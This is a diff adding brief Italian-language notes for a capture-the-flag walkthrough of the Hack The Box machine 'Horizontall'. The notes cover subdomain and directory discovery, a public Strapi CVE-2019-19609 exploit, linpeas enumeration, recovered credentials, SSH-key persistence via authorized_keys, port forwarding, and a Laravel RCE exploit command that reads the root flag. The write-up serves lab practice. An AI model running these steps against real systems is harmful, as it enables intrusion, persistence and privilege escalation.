@@ -1,0 +1,34 @@
+- ./gospider http://horizontall.htb
+    trovato api-prod.horizontall.htb
+
+- ffuf -w /usr/share/SecLists/Discovery/Web-Content/raft-large-directories.txt:FUZZ -u http://api-prod.horizontall.htb/FUZZ
+    trovato http://api-prod.horizontall.htb/admin/
+
+-exploit: 
+    https://github.com/diego-tella/CVE-2019-19609-EXPLOIT
+
+-user flag nella cartella /home/developer
+
+- trasferito linpeas con netcat:
+
+- upgrade shell:
+    /usr/bin/script -qc /bin/bash /dev/null
+
+- linpeas ha trovato credenziali developer:
+    username": "developer",
+    password": "#J!:F9Zt2u"
+    (utilizzabili per collegarsi al mysql)
+    
+- netstat -l
+    porta 8000 servizio laravell (vedi con curl)
+    Laravel v8 (PHP v7.4.18) 
+
+- aggiungere local rsa.pub alle authorized_keys (se non c'è creare il file)
+
+- port forwarding da macchina locale:
+    ssh -L 8000:127.0.0.1:8000 strapi@horizontall.htb
+
+- searchsploit laravel
+- searchsploit -p 49424 per vedere la location dell'exploit
+- con il port forwarding aperto in un altra tab, lanciare l'epxloit dalla macchina locale: python 49424.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log 'cat /root/root.txt'
+ 
